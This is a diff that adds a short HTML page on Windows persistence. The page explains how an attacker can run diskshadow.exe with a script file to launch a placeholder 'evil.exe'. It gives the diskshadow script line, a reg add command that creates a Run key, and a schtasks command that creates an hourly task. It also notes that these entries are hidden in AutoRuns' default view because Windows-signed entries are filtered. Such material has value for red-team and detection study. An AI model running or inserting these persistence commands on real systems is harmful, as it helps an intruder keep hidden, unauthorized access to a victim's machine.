@@ -1,0 +1,25 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Persistence</title>
+</head><body>Using a script/text file and diskshadow, an attacker can establish persistence in a variety of ways<br/>
+<br/>
+- diskshadow.txt -<br/>
+EXEC "cmd.exe" /c c:\test\evil.exe &nbsp;<br/>
+<br/>
+- Run Key Value -<br/>
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v VSSRun /t REG_EXPAND_SZ /d "diskshadow.exe /s c:\test\diskshadow.txt"<br/>
+<br/>
+- User Level Scheduled Task -<br/>
+schtasks /create /sc hourly /tn VSSTask /tr "diskshadow.exe /s c:\test\diskshadow.txt"<br/>
+<br/>
+<br/>
+AutoRuns – Run Key Value<br/>
+After creating the key value, we can see that our key is hidden when we open up AutoRuns and select the Logon tab.  By default, Windows signed executables are hidden from view (with a few notable exceptions).<br/>
+After de-selecting “Hide Windows Entries”, we can see the AutoRuns entry.<br/>
+<br/>
+<br/>
+AutoRuns – Scheduled Tasks<br/>
+Like the Run Key method, we can see that our entry is hidden in the default AutoRuns view<br/>
+After de-selecting “Hide Windows Entries”, we can see AutoRuns entry</body></html>
